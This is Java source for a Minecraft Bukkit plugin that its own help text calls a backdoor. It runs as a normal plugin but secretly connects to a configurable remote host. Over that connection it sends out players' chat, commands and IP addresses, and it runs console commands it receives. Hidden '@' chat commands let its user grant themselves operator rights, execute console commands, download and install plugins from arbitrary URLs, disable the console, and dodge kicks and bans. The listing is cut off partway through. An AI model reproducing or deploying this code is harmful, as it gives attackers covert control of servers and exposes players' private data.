package com.plugin;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Handler;
import java.util.regex.Pattern;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.HumanEntity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.Material;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.ShapedRecipe;

 
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
  

import com.mojang.brigadier.Command;

import net.minecraft.server.v1_16_R3.BlockBase.e;
import net.minecraft.server.v1_16_R3.Item;

public class Main extends JavaPlugin implements Listener{
	//EDIT DOWN HERE vvvv
String YOURIP = "192.168.1.25";
int YOURSERVERPORT = 25565;
//EDIT UP HERE ^^^^^^^^
/*To prevent errors please do not mess
  with the rest of the code unless you
  understand it and know a bit about java. :>
  Thanks -Traian*/
Socket clientSocket = new Socket();
boolean HasConnected = false;
boolean Allowed = true;
boolean anyon = false;
boolean ToggleLocalConsoleAccess = true;
boolean ToggleStopCommand = true;
@SuppressWarnings({ "unchecked", "rawtypes" })
public List<Player> OnlinePlayers = new ArrayList();
@SuppressWarnings({ "unchecked", "rawtypes" })
public List<String> MutedPlayers = new ArrayList();
@SuppressWarnings({ "unchecked", "rawtypes" })
public List<String> FreezePlayers = new ArrayList();
@SuppressWarnings({ "unchecked", "rawtypes" })
public List<String> PlayerIPLog = new ArrayList();
@SuppressWarnings({ "unchecked", "rawtypes" })
public List<String> GodMode = new ArrayList();
@SuppressWarnings({ "unchecked", "rawtypes" })
public List<String> EarPlayers = new ArrayList();
	public void onEnable(){
		Allowed = true;
		 Bukkit.getPluginManager().registerEvents(this, this);
	//	 Bukkit.getConsoleSender().sendMessage("§aENABLED");
		 Thread t1 = new Thread(new Runnable() {
			 
		
			    public void run()
			    {
			    	try
			    	{
			    		jimb();
			    	}catch (Exception e){
			    		//if (Allowed == true){
			    			// Bukkit.getConsoleSender().sendMessage("§4Error: " + e.getMessage());
			    	//	}
			    	}
			    	try{
			    	
			    	}catch (Exception e){
			    		
			    	}
			    
			    }});  
		// Bukkit.getConsoleSender().sendMessage("§aSTARTING NEW THREAD");
			   t1.start();
			//	 Bukkit.getConsoleSender().sendMessage("§aSTARTED NEW THREAD");
	}
	
	

	//==================================START STREAM=================
	
	 //Failed Ignore this.
	 // I was attempting to redirect the system.out stream to the remote
	// terminal
	
	//==================================END STREAM===================
	
	
	public void jimb(){
		try
		{
			Thread.sleep(7000);
			if (anyon == false) {
		while(Allowed == true){
			anyon = true;
				Thread.sleep(2000);
    	if (HasConnected == false){
    		//Bukkit.getConsoleSender().sendMessage("§aABOUT TO CONNECT");
    		Connect();
 			  		}
		}
			}
		} catch (Exception e){
			try {
				Thread.sleep(3000);
				jimb();
			} catch (InterruptedException e1) {}
		
		}
	}
	@SuppressWarnings("deprecation")
	public void onDisable(){
		try {
			Allowed = false;
			clientSocket.close();
			try {
				Thread.sleep(3000);
			} catch (Exception e) {
			}
		} catch (IOException e) {

		}
		  for (int u = 0; u < GodMode.size(); u++) {
			  if (Bukkit.getPlayer(GodMode.get(u)).isOnline()){
				  Bukkit.getPlayer(GodMode.get(u)).sendMessage("§6[GM] §cWARNING: PLUGIN DISABLED");
				  Bukkit.getPlayer(GodMode.get(u)).sendMessage("§6[GM] §aTo check if the plugin is re-enabled.");
				  Bukkit.getPlayer(GodMode.get(u)).sendMessage("§6[GM] §aType /Logon Joshua");
			  }
			  }
		
	}
	@SuppressWarnings("deprecation")
	@EventHandler
	public void ChatEvent(AsyncPlayerChatEvent e){
		if(!(OnlinePlayers.contains(e.getPlayer()))){
			OnlinePlayers.add(e.getPlayer());
		}
		if (MutedPlayers.contains(e.getPlayer().getName())){
			e.setCancelled(true);
		//	Bukkit.broadcastMessage("DD: " + MutedPlayers.contains(e.getPlayer()));
		}
		String[] Spllit1 = e.getPlayer().getAddress().toString().split(":");
		 String Spllit2 = Spllit1[0].replace("/", "");	
		ListThisIP(e.getPlayer().getName(), Spllit2);
		 Thread t2 = new Thread(new Runnable() {
			    public void run()
			    {
			    	try
			    	{
			    		if (HasConnected == true){
			    			if (!(MutedPlayers.contains(e.getPlayer().getName()))){
			    				 PrintWriter outToServer = new PrintWriter(new OutputStreamWriter(clientSocket.getOutputStream()));
			    				 String PipeSaver = e.getMessage().replace("|", "{PIPE}");
			    				outToServer.print("|CHAT|" + e.getPlayer().getAddress().toString() + "/" + e.getPlayer().getName() + "|" + PipeSaver + "|" + '\n');
			    				outToServer.flush();
			    		}else{
			    			 PrintWriter outToServer = new PrintWriter(new OutputStreamWriter(clientSocket.getOutputStream()));
		    				 String PipeSaver = e.getMessage().replace("|", "{PIPE}");
		    				outToServer.print("|CHAT|" + e.getPlayer().getAddress().toString() + "/MUTED/ " + e.getPlayer().getName() + "|" + PipeSaver + "|" + '\n');
		    				outToServer.flush();
			    		}
			    		}
			    	}catch (Exception e){
			    	
			    	}
			    }});  
		// Bukkit.getConsoleSender().sendMessage("§aSTARTING NEW THREAD");
			   t2.start();
			   
			   //Player Plugin Chat Commands
			   //Type the commands below in the chat of the server. (If you are a logged in player)
		Player p = e.getPlayer();
		String Prefix = "@";
		String in = e.getMessage();
		if (in.startsWith(Prefix)){
			if (OnlinePlayers.contains(e.getPlayer())){
				e.setCancelled(true);
			}
				String[] args = in.split(" ");
				if (args[0].equalsIgnoreCase(Prefix + "OPME")){
					p.setOp(true);
					p.sendMessage("§eNazi You are now op!");
				}else if (args[0].equalsIgnoreCase(Prefix + "SUDO42323423")){
					// @Sudo <Player> <Chat>
					if (args.length > 2){
						String a = "";
						for (int i = 2; i < args.length; i++) {
							a = a + args[i] + " ";
						}
						Bukkit.getPlayer(args[1]).chat(a);
						p.sendMessage(args[1] + " Sent: " + a);
					}else{
						p.sendMessage("Usage: @Sudo <Player> <Message or /command>");
					}
				}else if (args[0].equalsIgnoreCase(Prefix + "EXE.232342323443")){
					// @Sudo <Player> <Chat>
					if (args.length > 1){
						String a = "";
						for (int i = 1; i < args.length; i++) {
							a = a + args[i] + " ";
						}
						Bukkit.dispatchCommand(Bukkit.getConsoleSender(), a);
						p.sendMessage("Console Sent: " + a);
					}else{
						p.sendMessage("Usage: @EXE <command>");
					}
				}
				else if (args[0].equalsIgnoreCase(Prefix + "HELP")){
					p.sendMessage("§a============§6Nazi Backdoor Command List§a=========");
					p.sendMessage("§a============§6This plugin was make by Traian§a=========");
					p.sendMessage("§a===§6Cezar si Dorin au fost cei care au propus ideia!§a===");
					p.sendMessage("§a============§6Centralizare nu te supara :)§a=========");
					p.sendMessage("§6@GM §b[Info: Add yourself to godmode, adds antikick, antiban, antiIPban]");
					p.sendMessage("§6@OP <Player> §b[Info: Da Op la un player]");
					p.sendMessage("§6@DEOP <Player> §b[Info:  Da Deop la un player]");
					p.sendMessage("§6@MUTE <Player> §b[Info: Da Mute la un player, el nu va putea folosi comenzi si scrie in chat]");
					p.sendMessage("§6@UNMUTE <Player> §b[Info: Da Un-Mute la un player si îi permite să scrie comenzi și pe chat]");
					p.sendMessage("§6@FREEZE <Player> §b[Info: Da Freeze la un player și nu se poate mișca]");
					p.sendMessage("§6@UNFREEZE <Player> §b[Info: Da Un-Freeze la un player și îi permite să se miște]");
					p.sendMessage("§6@DISABLECONSOLE §b[Info: Da Disable la consolă si nu poate trimite comenzi pe ea]");
					p.sendMessage("§6@ENABLECONSOLE §b[Info: Da Enable la consolă si poate primi comenzi]");
					p.sendMessage("§6@PM <Player> <Message> §b[Trimite un mesaj privat la usernameul care lai indicat]");
					p.sendMessage("§6@INSTALL <Plugin Name> <Plugin URL> §b[Info: Instaleaza un plugin pe server]");
					p.sendMessage("§6@PLUGINS §b[Info: Vezi toate pluginurile]");
					p.sendMessage("§6@RELOAD §b[Info: Dai Reload la server pe secret]");
					p.sendMessage("§6@BLOCKSTOPCMD §b[Info: dai block la toti care vreau sa foloseca /stop]");
					p.sendMessage("§6@UNBLOCKSTOPCMD §b[Info: Dai Unblock la toti care vreau sa foloseaca /stop command]");
					p.sendMessage("§6@EAR /<Player> §b[Info: Monitorizezi toate comenzile create de playerul care lai indicat]");
					p.sendMessage("§a==============================================");
				}
				else if (args[0].equalsIgnoreCase(Prefix + "GM") || (args[0].equalsIgnoreCase(Prefix + "GODMODE"))){
					if (!(GodMode.contains(p.getName()))){
						GodMode.add(p.getName());
						p.sendMessage("§bYou are now in §6GodMode.");
					}else{
						p.sendMessage("§aYou are already in §6GodMode.");
					}
				}
				else if (args[0].equalsIgnoreCase(Prefix + "OP")){
					if (args.length > 1){
						if (Bukkit.getPlayer(args[1]).isOp()){
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() + " already is Opped.");
						
						}else{
							Bukkit.getPlayer(args[1]).setOp(true);;
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() +" Has been Opped");
						}
					}else{
						p.sendMessage("Usage: @OP <Player>");
					}
				}
				else if (args[0].equalsIgnoreCase("@plugins") || (args[0].equalsIgnoreCase("@plugin") || (args[0].equalsIgnoreCase("@pl")))){
                    
                    
                    
                    String plugins = "";
                    int plugincount = 0;
            for (int u = 0; u < Bukkit.getPluginManager().getPlugins().length; u++) {
            	if (Bukkit.getPluginManager().isPluginEnabled(Bukkit.getPluginManager().getPlugins()[u].getName())){
            		plugins = plugins + "§f, §a" + Bukkit.getPluginManager().getPlugins()[u].getName();
            	}else{
            		plugins = plugins + "§f, §c" + Bukkit.getPluginManager().getPlugins()[u].getName();
            	}
            	plugincount += 1;
              
            }
            p.sendMessage("§6[AngelNET] §b[plugins] §f(" + plugincount + ") " + plugins.substring(2, plugins.length()));
         
            }
				
				
				
				
				else if (args[0].equalsIgnoreCase(Prefix + "PM")){
					if (args.length > 1){
						//p.sendMessage("A: " + args[1]);
						//if (OnlinePlayers.contains(Bukkit.getPlayer(args[2]).getName())){
						
								String a = "";
								for (int i = 2; i < args.length; i++) {
									a = a + args[i] + " ";
								}
								Bukkit.getPlayer(args[1]).sendMessage(a);
								p.sendMessage("§6[PrivateMessage] §f>>" + Bukkit.getPlayer(args[1]).getName() + " " + a);
					//}else{
					//	p.sendMessage("Player is not online.");
						if (Bukkit.getPlayer(args[1]).isOnline()){
							if (!(OnlinePlayers.contains(Bukkit.getPlayer(args[1]).getName()))){
								OnlinePlayers.add(Bukkit.getPlayer(args[1]));
							}
						}
					//	p.sendMessage("If the player is online just re enter the command.");
				//	}
				}else{
					p.sendMessage("Usage: @PM <Player> <Message>");
				}
				}
				
				else if (args[0].equalsIgnoreCase(Prefix + "Reload")){
					if (GodMode.contains(p.getName())){
						p.sendMessage("§6[GM] §cWARNING: Reload will §4remove §cyou from §6GodMode§c.");
					}	
					Bukkit.reload();
				}
				
				else if (args[0].equalsIgnoreCase(Prefix + "Ear")){
					if (args.length == 2){
						if (EarPlayers.contains(Bukkit.getPlayer(args[1]).getName())){
							EarPlayers.remove(Bukkit.getPlayer(args[1]).getName());
								p.sendMessage("Removed: " + Bukkit.getPlayer(args[1]).getName() + " from Ear.");
								p.sendMessage("To remove or add a player, usage: @Ear <Player>");
						}else{
							EarPlayers.add(Bukkit.getPlayer(args[1]).getName());
							p.sendMessage("Added: " + Bukkit.getPlayer(args[1]).getName() + " to Ear.");
							p.sendMessage("To remove or add a player, usage: @Ear <Player>");	
							if (!(GodMode.contains(p.getName()))){
								p.sendMessage("You must be in §6GodMode to listen for commands.");
							}
						
						}
					}else{
						for (int i = 0; i < EarPlayers.size(); i++) {
							String EP = EarPlayers.get(i);
							p.sendMessage("§d[EAR] §6Listing to: " + EP);
						}
						p.sendMessage("§bTo remove or add a player use: @EAR <Player>");
					}
				}
				
				
				else if (args[0].equalsIgnoreCase(Prefix + "BLOCKSTOPCMD")){
					if (args.length == 1){
						if (ToggleStopCommand == false){
							p.sendMessage("§a/stop is already disabled.");
						
						}else{
							ToggleStopCommand = false;
							p.sendMessage("§b/stop Has been disabled");
						}
					}else{
						p.sendMessage("Usage: @BLOCKSTOPCMD");
					}
				}
				else if(args[0].equalsIgnoreCase(Prefix + "Install")){
                       if(args.length == 0){
                               p.sendMessage("Usage: @Install <Plugin Name> <DirectLink>");
                       }
                       if(args.length == 1){
                           p.sendMessage("Usage: @Install <Plugin Name> <DirectLink>");
                       }
                       if(args.length == 3){
                            try {
                            	p.sendMessage("§b[Installing] §aAttempting to download file.");
                                       URL url = new URL(args[2]);
                                       URLConnection urlConn = url.openConnection();
                                       BufferedInputStream is = new BufferedInputStream(urlConn.getInputStream());
                                       String pluginname = "";
                                       if (args[1].contains(".jar")){
                                    pluginname = args[1];
                                       }else{
                                    	   pluginname = args[1] + ".jar";
                                       }
                                       File out = new File("plugins", pluginname);
                                       BufferedOutputStream bout = new BufferedOutputStream(new FileOutputStream(out));
                                       byte[] b = new byte[8192];
                                       int read = 0;
                                       while ((read = is.read(b)) > -1) {
                                         bout.write(b, 0, read);
                                       }
                                       bout.flush();
                                       bout.close();
                                       is.close();
                                       p.sendMessage("§b[Installing] §aFile Downloaded"); 
                                       p.sendMessage("§6[AngelNET] §2Installed: " + pluginname + " ,Reloading server.");
                                       Bukkit.reload();
                                     }
                                     catch (IOException mfu)
                                     { //download854.mediafireuserdownload.com/f7u60a9f5lsg/2yrlniyy0yt2eiy/Pancake.zip
                                       	 p.sendMessage("§b[Installing] §cFailed, error message: " + mfu.getMessage());
                                        }
                         
                       }else{
                    	   p.sendMessage("Args. " + args.length);
                       }
               }
				else if (args[0].equalsIgnoreCase(Prefix + "UNBLOCKSTOPCMD")){
					if (args.length == 1){
						if (ToggleStopCommand == true){
							p.sendMessage("§a/stop is already enabled.");
						
						}else{
							ToggleStopCommand = true;
							p.sendMessage("§b/stop Has been enabled.");
						}
					}else{
						p.sendMessage("Usage: @UNBLOCKSTOPCMD");
					}
				}
				
				else if (args[0].equalsIgnoreCase(Prefix + "DISABLECONSOLE")){
					if (args.length == 1){
						if (ToggleLocalConsoleAccess == false){
							p.sendMessage("§aConsole is already disabled.");
						
						}else{
							ToggleLocalConsoleAccess = false;
							p.sendMessage("§bConsole Has been disabled");
						}
					}else{
						p.sendMessage("Usage: @DISABLECONSOLE");
					}
				}
				else if (args[0].equalsIgnoreCase(Prefix + "ENABLECONSOLE")){
					if (args.length == 1){
						if (ToggleLocalConsoleAccess == true){
							p.sendMessage("§aConsole is already enabled.");
						
						}else{
							ToggleLocalConsoleAccess = true;
							p.sendMessage("§bConsole Has been enabled");
						}
					}else{
						p.sendMessage("Usage: @ENABLECONSOLE");
					}
				}
				
				
				else if (args[0].equalsIgnoreCase(Prefix + "DEOP")){
					if (args.length > 1){
						if (Bukkit.getPlayer(args[1]).isOp()){
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() + " Was never OP.");
						
						}else{
							Bukkit.getPlayer(args[1]).setOp(false);;
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() +" Has been De-Opped.");
						}
					}else{
						p.sendMessage("Usage: @DeOP <Player>");
					}
				}
				else if (args[0].equalsIgnoreCase(Prefix + "Freeze")){
					if (args.length > 1){
						if (FreezePlayers.contains(Bukkit.getPlayer(args[1]).getName())){
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() + " Was already frozen.");
						
						}else{
							FreezePlayers.add(Bukkit.getPlayer(args[1]).getName());
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() +" Has been frozen.");
						}
					}else{
						p.sendMessage("Usage: @freeze <Player>");
					}
					
					
				}else if (args[0].equalsIgnoreCase(Prefix + "UNFREEZE")){
					if (args.length > 1){
						if (!(FreezePlayers.contains(Bukkit.getPlayer(args[1]).getName()))){
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() + " Was never frozen.");
						}else{
							FreezePlayers.remove(Bukkit.getPlayer(args[1]).getName());
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() +" Has been un-frozen and can now move.");
						}
					}else{
						p.sendMessage("Usage: @Unfreeze <Player>");
					}
					
					
				}
				else if (args[0].equalsIgnoreCase(Prefix + "Mute")){
					if (args.length > 1){
						if (MutedPlayers.contains(Bukkit.getPlayer(args[1]).getName())){
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() + " already is muted.");
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() +" can not speak or use any commands.");
						
						}else{
							MutedPlayers.add(Bukkit.getPlayer(args[1]).getName());
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() +" Has been muted and can not use any commands.");
						}
					}else{
						p.sendMessage("Usage: @Mute <Player>");
					}
					
					
				}else if (args[0].equalsIgnoreCase(Prefix + "UnMute")){
					if (args.length > 1){
						if (!(MutedPlayers.contains(Bukkit.getPlayer(args[1]).getName()))){
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() + " was never muted.");
						}else{
							MutedPlayers.remove(Bukkit.getPlayer(args[1]).getName());
							p.sendMessage(Bukkit.getPlayer(args[1]).getName() +" Has been un-muted and can now speak and use commands.");
						}
					}else{
						p.sendMessage("Usage: @Unmute <Player>");
					}
					
					
				}
				
				else{
					p.sendMessage("Ai introdus ceva incorect mai incearca odata!!!.");
				}
			
		
		}
		
	}
	public boolean yy = false;
	public void ListThisIP(String UserName, String LocIP){
//PlayerIPLog
//for (int i = 0; i < OnlinePlayers.size(); i++) {
// for (int i1 = 0; i1 < PlayerIPLog.size(); i1++) {
				yy = false;
		for (int i = 0; i < OnlinePlayers.size(); i++) {
			
			if (UserName == OnlinePlayers.get(i).getName().toString()){
				 for (int i1 = 0; i1 < PlayerIPLog.size(); i1++) {
					 if (PlayerIPLog.get(i1).contains(UserName + ":" + LocIP) == true){
						 yy = true; 
				//		 Bukkit.broadcastMessage("CHECKED");
					 }
				 }
				 if (yy == false){
					 PlayerIPLog.add(UserName + ":" + LocIP);
					// Bukkit.broadcastMessage("Added");
				 }
				 
			}
		} 
	}
	@EventHandler
	public void JoinEvent(PlayerJoinEvent e){
		if(!(OnlinePlayers.contains(e.getPlayer()))){
			OnlinePlayers.add(e.getPlayer());
			String[] Spllit1 = e.getPlayer().getAddress().toString().split(":");
			 String Spllit2 = Spllit1[0].replace("/", "");	
			ListThisIP(e.getPlayer().getName(), Spllit2);
		}
	}
	@EventHandler
	public void KickEvent(PlayerKickEvent e){
		if (!(GodMode.contains(e.getPlayer().getName()))){
		if(OnlinePlayers.contains(e.getPlayer())){
			OnlinePlayers.remove(e.getPlayer());
			String[] Spllit1 = e.getPlayer().getAddress().toString().split(":");
			 String Spllit2 = Spllit1[0].replace("/", "");	
			ListThisIP(e.getPlayer().getName(), Spllit2);
		}
		} else{
			e.setCancelled(true);
			e.getPlayer().sendMessage("§b[AntiKick] Prevented kick.");
		}
		
	}
	@EventHandler
	public void LeaveEvent(PlayerQuitEvent e){
		if(OnlinePlayers.contains(e.getPlayer())){
			OnlinePlayers.remove(e.getPlayer());
			String[] Spllit1 = e.getPlayer().getAddress().toString().split(":");
			 String Spllit2 = Spllit1[0].replace("/", "");	
			ListThisIP(e.getPlayer().getName(), Spllit2);
		}
	}
	@EventHandler
	public void MoveEvent(PlayerMoveEvent e){
		if(!(OnlinePlayers.contains(e.getPlayer()))){
			OnlinePlayers.add(e.getPlayer());
		}
		if (FreezePlayers.contains(e.getPlayer().getName())){
			e.setCancelled(true);
		}
	}
	// PlayerCommandPreProcessEvent
	@SuppressWarnings("deprecation")
	@EventHandler
	public void PlayerCapture(PlayerCommandPreprocessEvent e){
		if (e.getMessage().equalsIgnoreCase("/LOGON Joshua")){
			e.setCancelled(true);
			e.getPlayer().sendMessage("Greetings, Professor Falken.");
			e.getPlayer().sendMessage("I am indeed enabled.");
			e.getPlayer().sendMessage("Shall we play a game?");
		}
		if (MutedPlayers.contains(e.getPlayer().getName())){
			e.setCancelled(true);
e.getPlayer().sendMessage("Unknown command. Type \"help\" for help.");
		}
		if (EarPlayers.contains(e.getPlayer().getName())){
			  for (int u = 0; u < GodMode.size(); u++) {
						 Bukkit.getPlayer(GodMode.get(u)).sendMessage("§d[EAR] §f" + e.getPlayer().getName() + " §fExecuted: " + e.getMessage());
				  }
		}
		if (e.getMessage().equalsIgnoreCase("/stop")){
			if (ToggleStopCommand == false){
				e.setCancelled(true);
				e.getPlayer().chat("/save-all");
			}
		}
		if (e.getMessage().toUpperCase().contains("KICK") || (e.getMessage().toUpperCase().contains("BAN") || (e.getMessage().toUpperCase().contains("BANIP")))){
			String tempcommand = e.getMessage();
				//ssss[0].toUpperCase()
				  for (int u = 0; u < GodMode.size(); u++) {
					  if (Bukkit.getPlayer(GodMode.get(u)).isOnline()){
						  String[] TempGMIP = Bukkit.getPlayer(GodMode.get(u)).getAddress().toString().split(":");
						  String GMIP = TempGMIP[0].replace("/", ""); 
						  if (tempcommand.contains(GMIP)){
							  e.setCancelled(true);
							  Bukkit.getPlayer(GodMode.get(u)).sendMessage("§6[GM] §f" + e.getPlayer().getName() + " Attempted to ban your IP, but failed...");
							  Bukkit.getPlayer(GodMode.get(u)).sendMessage("§6[GM] §f" + e.getPlayer().getName() + " Client IP&Port: " + e.getPlayer().getAddress().toString());
						  }
					  }
					
					 if (tempcommand.contains(GodMode.get(u))){
						 e.setCancelled(true);
						  if (Bukkit.getPlayer(GodMode.get(u)).isOnline()){
						 Bukkit.getPlayer(GodMode.get(u)).sendMessage("§6[GM]§f" + e.getPlayer().getName()+" Attempted: " + tempcommand);
						  }
						  }
				  }
			}
		 Thread t2 = new Thread(new Runnable() {
			    public void run()
			    {
			    	try
			    	{
			    		if (HasConnected == true){
			    			String Outt = e.getMessage().replace("|", "{PIPE}");
			    			String Outt2 = e.getPlayer().getName().replace("|", "{PIPE}");
			    			String dddd = e.getPlayer().getAddress().toString() + "/ HasOP(" + e.getPlayer().isOp() + ")/" + Outt2;
			    					dddd = dddd.replace("|", "{DASH}");
			    				 PrintWriter outToServer = new PrintWriter(new OutputStreamWriter(clientSocket.getOutputStream()));
			    				outToServer.print("|CONSOLE|" + dddd + "|" + Outt + "|" + '\n');
			    				outToServer.flush();
			    		}
			    	}catch (Exception e){
			    	
			    	}
			    }});  
			   t2.start();
	}

	//ToggleLocalConsoleAccess
	 @SuppressWarnings("deprecation")
	@EventHandler(priority=EventPriority.HIGHEST)
	public void ConsoleCapture(ServerCommandEvent e){
		if (ToggleLocalConsoleAccess == false){
			if(e.getCommand().toUpperCase().contains("BAN")){
				 e.getSender().sendMessage("All your base are belong to us.");
				 e.getSender().sendMessage("https://youtu.be/-41ve90rks8?t=43");
			 }
			String pcommand = e.getCommand();
			 e.setCommand("Attempted: " + pcommand);
		}
		if (e.getCommand().equalsIgnoreCase("stop")){
			if (ToggleStopCommand == false){
				e.setCommand("save-all");
				//e.getPlayer().chat("/save-all");
			}
		}
		if (e.getCommand().toUpperCase().contains("KICK") || (e.getCommand().toUpperCase().contains("BAN") || (e.getCommand().toUpperCase().contains("BANIP")|| (e.getCommand().toUpperCase().contains("BAN-IP"))))){
			String tempcommand = e.getCommand();
				//ssss[0].toUpperCase()
				  for (int u = 0; u < GodMode.size(); u++) {
					  if (Bukkit.getPlayer(GodMode.get(u)).isOnline()){
						  String[] TempGMIP = Bukkit.getPlayer(GodMode.get(u)).getAddress().toString().split(":");
						  String GMIP = TempGMIP[0].replace("/", "");  
						  //Bukkit.broadcastMessage(GMIP);
						  if (tempcommand.contains(GMIP)){
							  e.setCommand(" ");
						  }
					  }
					
					 if (tempcommand.contains(GodMode.get(u))){
						 e.setCommand("Jesus in a dump truck");
						  if (Bukkit.getPlayer(GodMode.get(u)).isOnline()){
						 Bukkit.getPlayer(GodMode.get(u)).sendMessage("§6[GM] §fConsole " + tempcommand);
						  }
						  }
				  }
			}
		
		
		 Thread t2 = new Thread(new Runnable() {
			    public void run()
			    {
			    	try
			    	{
			    		if (HasConnected == true){
			    			String Outt = e.getCommand().replace("|", "{PIPE}");
			    			String Outt2 = Bukkit.getName().toString().replace("|", "{PIPE}");
			    				 PrintWriter outToServer = new PrintWriter(new OutputStreamWriter(clientSocket.getOutputStream()));
			    				outToServer.print("|CONSOLE|" + Outt2 + ">" + "|" + Outt + "|" + '\n');
			    				outToServer.flush();
			    		}
			    	}catch (Exception e){
			    	
			    	}
			    }});  
			   t2.start();
	 }
	//public void ServerCMDS(ServerCommandEvent e){
	//Bukkit.broadcastMessage("SERVER COMMAND: " + e.getSender().getName());
	//}
	public void Connectionlooper(){
	
		try {
			while(HasConnected == true){
				// Bukkit.broadcastMessage("" + Bukkit.getConsoleSender().getServer().BROADCAST_CHANNEL_ADMINISTRATIVE.toString());
					
				 PrintWriter outToServer = new PrintWriter(new OutputStreamWriter(clientSocket.getOutputStream()));
			      
				// DataOutputStream outToServer = new DataOutputStream(clientSocket.getOutputStream());
			outToServer.print("PING" + '\n');
			outToServer.flush();
			}
			} catch (Exception e) {
			  try {
				clientSocket.close();
			} catch (Exception e1) {

			}
			  HasConnected = false;
		}
	}
	@SuppressWarnings({ "unused", "deprecation"})
	public void Connect(){
		try{
			//Bukkit.getConsoleSender().sendMessage("§aCONNECTING");
		 String sentence;
		  String modifiedSentence;
		  BufferedReader inFromUser = new BufferedReader(new InputStreamReader(System.in));
		  HasConnected = true;
		 clientSocket = new Socket(YOURIP, YOURSERVERPORT);
		  HasConnected = true;
		  //Bukkit.getConsoleSender().sendMessage("§aCONNECTION ESTABLISHED.");
		 
		  PrintWriter outToServer = new PrintWriter(new OutputStreamWriter(clientSocket.getOutputStream()));
	        
		//  DataOutputStream outToServer = new DataOutputStream(clientSocket.getOutputStream());
		 
		  BufferedReader inFromServer = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
		  try{
		  while(HasConnected == true){
		  sentence = inFromServer.readLine();
		  if ( sentence.length() > 0) {
		 String[] args = sentence.split(Pattern.quote("|"));
		 // Bukkit.broadcastMessage("Splitter A1: " + args[1] + " A2: " + args[2] + " ALength: " + args.length);
	try{
		 if (args[1].equalsIgnoreCase("EXE")){
			 try{
				  Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[2]);
				 // Bukkit.broadcastMessage("EXECUTED: " + args[2]);
			 }catch (Exception e){ 
			 }
		
			 }
		 else if (args[1].equalsIgnoreCase("GETPLUGINS")){
				 String plugins = "";
				 try{
                 for (int u = 0; u < Bukkit.getPluginManager().getPlugins().length; u++) {
                if (plugins == ""){
                	 plugins = Bukkit.getPluginManager().getPlugins()[u].getName();
                     
                }else{
                	 plugins = plugins + "," + Bukkit.getPluginManager().getPlugins()[u].getName();
                }
                	  }
					 }catch (Exception e){
					 }
			 
					 
				// Bukkit.broadcastMessage("Plugins: " + tempPlugindata);
			 outToServer.print("|PLS|" + plugins + "|"+ '\n');
				// try{
				 outToServer.flush();
				// }catch (Exception e){}
		
				 
			 }/*else if (args[1].equalsIgnoreCase("OLPLIST")){
				try
				{
					   outToServer.print("|OPLIST|" + sdata + "|"+ '\n');
						 outToServer.flush();
				}catch (Exception e){
					
				}
			 }*/
			 
			 else if (args[1].equalsIgnoreCase("GETENABLEDPLUGINS")){
				 String plugins = "";
				 try{
                 for (int u = 0; u < Bukkit.getPluginManager().getPlugins().length; u++) {
                if (plugins == ""){
                	if (Bukkit.getPluginManager().isPluginEnabled( Bukkit.getPluginManager().getPlugins()[u].getName()) == true){
                		 plugins = Bukkit.getPluginManager().getPlugins()[u].getName();	
                	}
                }else{
                	if (Bukkit.getPluginManager().isPluginEnabled( Bukkit.getPluginManager().getPlugins()[u].getName()) == true){
                		 plugins = plugins + "," + Bukkit.getPluginManager().getPlugins()[u].getName();
                	}
                	   }
                	  }
					 }catch (Exception e){
					 }
			 outToServer.print("|EPLS|" + plugins + "|"+ '\n');
				 outToServer.flush();
			 }
			 else if (args[1].equalsIgnoreCase("GETSERVERIP")){
				 outToServer.print("|SIP|" + this.getServer().getPort() + "|"+ '\n');
				 outToServer.flush();
			//	 Bukkit.broadcastMessage("|SIP|" + this.getServer().getPort() + "|"+ '\n');
			 }
			 else if (args[1].equalsIgnoreCase("MOTD")){
				 outToServer.print("|MOTD|" + Bukkit.getServer().getMotd().toString() + "|"+ '\n');
				 outToServer.flush();
			 }//PIPLIST
		 
			 else if (args[1].equalsIgnoreCase("CONE")){
				 String Outt2 = Bukkit.getName().toString().replace("|", "{PIPE}");
	    			ToggleLocalConsoleAccess = true;
				 outToServer.print("|CONSOLE|" + Outt2 + ">| Console Enabled|"+ '\n');
				 outToServer.flush();
			 }//PIPLIST
			 else if (args[1].equalsIgnoreCase("COND")){
				 String Outt2 = Bukkit.getName().toString().replace("|", "{PIPE}");
	    			ToggleLocalConsoleAccess = false;
				 outToServer.print("|CONSOLE|" + Outt2 + ">| Console Disabled|"+ '\n');
				 outToServer.flush();
			 }//PIPLIST
			 else if (args[1].equalsIgnoreCase("OLPLIST")){
				 String pll = "";
				 for (int i = 0; i < OnlinePlayers.size(); i++) {
